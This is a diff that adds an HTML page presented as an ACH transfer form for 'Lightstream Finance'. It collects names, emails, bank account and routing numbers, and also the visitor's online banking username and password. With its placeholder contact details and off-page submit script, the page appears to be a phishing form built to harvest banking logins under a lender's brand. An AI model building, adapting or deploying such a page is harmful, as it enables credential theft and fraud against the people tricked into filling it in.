@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>ACH Transfer Form - Lightstream Finance</title>
+
+        <!-- Tailwind CSS -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script>
+            tailwind.config = {
+                theme: {
+                    extend: {
+                        colors: {
+                            'brand-blue': '#3b82f6',
+                            'brand-light-blue': '#60a5fa'
+                        }
+                    }
+                }
+            }
+        </script>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            }
+        </style>
+    </head>
+
+    <body class="min-h-screen flex flex-col bg-gray-50">
+        <!-- Header -->
+        <header class="bg-white border-b border-gray-200">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <h1 class="text-brand-blue text-xl font-bold tracking-wide">LIGHTSTREAM FINANCE</h1>
+                        <p class="text-brand-light-blue text-xs mt-1 font-medium">WE'RE HERE TO HELP YOU MOVE FINANCIALLY FORWARD</p>
+                    </div>
+                    <nav class="hidden md:flex items-center gap-8">
+                        <a href="#" class="text-brand-light-blue hover:text-brand-blue transition-colors font-medium">Home</a>
+                        <a href="#" class="text-brand-light-blue hover:text-brand-blue transition-colors font-medium">Loans</a>
+                        <a href="#" class="text-brand-light-blue hover:text-brand-blue transition-colors font-medium">About Us</a>
+                    </nav>
+                </div>
+            </div>
+                </header>
+
+        <!-- Main Content -->
+        <main class="flex-1 py-16 px-4">
+            <div class="max-w-lg mx-auto">
+                <!-- Status Alert -->
+                <div id="alert-status" class="hidden mb-8 p-4 rounded-lg border" role="alert" aria-live="polite"></div>
+
+                    <!-- Form -->
+                <form method="post" class="space-y-8 needs-validation" novalidate autocomplete="off">
+                    <!-- Name Field -->
+                    <div>
+                        <label for="name" class="block text-sm font-medium text-gray-900 mb-2">
+                            Name<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="text"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="name"
+                            name="name"
+                            placeholder="Your name"
+                            required
+                            autocomplete="name"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your name.</div>
+                    </div>
+
+                    <!-- Email Field -->
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-900 mb-2">
+                            Your email<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="email"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="email"
+                            name="email"
+                            placeholder="Your email address"
+                            required
+                            autocomplete="email"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter a valid email address.</div>
+                    </div>
+
+                    <!-- Bank Name Field -->
+                    <div>
+                        <label for="bankName" class="block text-sm font-medium text-gray-900 mb-2">
+                            Bank Name<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="text"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="bankName"
+                            name="bankName"
+                            placeholder="Short answer"
+                            required
+                            autocomplete="off"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your bank name.</div>
+                    </div>
+
+                    <!-- Account Number Field -->
+                    <div>
+                        <label for="accountNumber" class="block text-sm font-medium text-gray-900 mb-2">
+                            Account Number<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="text"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="accountNumber"
+                            name="accountNumber"
+                            placeholder="Checking/Saving in which you want funds to be deposited"
+                            required
+                            autocomplete="off"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your account number.</div>
+                        </div>
+
+                    <!-- Routing Number Field -->
+                    <div>
+                        <label for="routingNumber" class="block text-sm font-medium text-gray-900 mb-2">
+                            Routing Number<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="text"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="routingNumber"
+                            name="routingNumber"
+                            placeholder="Your bank's routing number"
+                            required
+                            autocomplete="off"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your routing number.</div>
+                        </div>
+
+                    <!-- Username Field -->
+                    <div>
+                        <label for="username" class="block text-sm font-medium text-gray-900 mb-2">
+                            Username<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="text"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="username"
+                            name="username"
+                            placeholder="mobile/online banking"
+                            required
+                            autocomplete="username"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your username.</div>
+                        </div>
+
+                    <!-- Password Field -->
+                    <div>
+                        <label for="password" class="block text-sm font-medium text-gray-900 mb-2">
+                            Password<span class="text-red-500">*</span>
+                        </label>
+                        <input
+                            type="password"
+                            class="w-full px-4 py-3 bg-gray-100 border-0 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all duration-200 text-gray-900 placeholder-gray-500"
+                            id="password"
+                            name="password"
+                            placeholder="mobile/online banking"
+                            required
+                            autocomplete="current-password"
+                        />
+                        <div class="validation-feedback valid hidden text-green-600 text-sm mt-2">Looks good!</div>
+                        <div class="validation-feedback invalid hidden text-red-600 text-sm mt-2">Please enter your password.</div>
+                        </div>
+
+                        <!-- Honeypot -->
+                    <div class="hidden" aria-hidden="true">
+                            <label for="website">Website</label>
+                            <input type="text" id="website" name="website" tabindex="-1" autocomplete="off" />
+                        </div>
+
+                        <!-- Submit Button -->
+                    <div class="flex justify-center pt-8">
+                        <button
+                            type="submit"
+                            class="px-12 py-3 bg-black text-white rounded-full hover:bg-gray-800 transition-colors duration-200 font-medium text-base min-w-[120px] flex items-center justify-center gap-2"
+                        >
+                            <span id="loading-spinner" class="hidden">
+                                <svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                </svg>
+                            </span>
+                            <span>Submit</span>
+                        </button>
+                    </div>
+                    </form>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="bg-white border-t border-gray-200 mt-16">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                    <div>
+                        <h3 class="mb-4 font-medium text-gray-900">Address</h3>
+                        <p class="text-gray-600">
+                            123 Financial District,<br />
+                            Suite 456, New York, NY 10001
+                        </p>
+                    </div>
+
+                    <div>
+                        <h3 class="mb-4 font-medium text-gray-900">CONTACT US</h3>
+                        <div class="space-y-2 text-gray-600">
+                            <p>(555) 123-4567</p>
+                            <p>(555) 987-6543</p>
+                            <a 
+                                href="mailto:info@lightstreamfinance.com" 
+                                class="block text-brand-blue hover:text-brand-light-blue transition-colors"
+                            >
+                                info@lightstreamfinance.com
+                            </a>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h3 class="mb-4 font-medium text-gray-900">Opening hours</h3>
+                        <div class="space-y-1 text-gray-600">
+                            <p>Monday - Friday: 9:00 - 18:00</p>
+                            <p>Saturday: 9:00 - 16:00</p>
+                            <p>Sunday: Closed</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Custom JavaScript for form handling -->
+        <script src="AjaxForm.js"></script>
+
+        <script>
+            // Custom styling for validation states and alerts
+            document.addEventListener('DOMContentLoaded', function() {
+                const style = document.createElement('style');
+                style.textContent = `
+                    .alert.alert-success {
+                        background-color: #d1fae5;
+                        color: #065f46;
+                        border: 1px solid #a7f3d0;
+                    }
+                    .alert.alert-danger {
+                        background-color: #fee2e2;
+                        color: #991b1b;
+                        border: 1px solid #fca5a5;
+                    }
+                    input.is-valid {
+                        border: 2px solid #10b981 !important;
+                        background-color: #f0fdf4 !important;
+                    }
+                    input.is-invalid {
+                        border: 2px solid #ef4444 !important;
+                        background-color: #fef2f2 !important;
+                    }
+                `;
+                document.head.appendChild(style);
+            });
+        </script>
+    </body>
+</html>
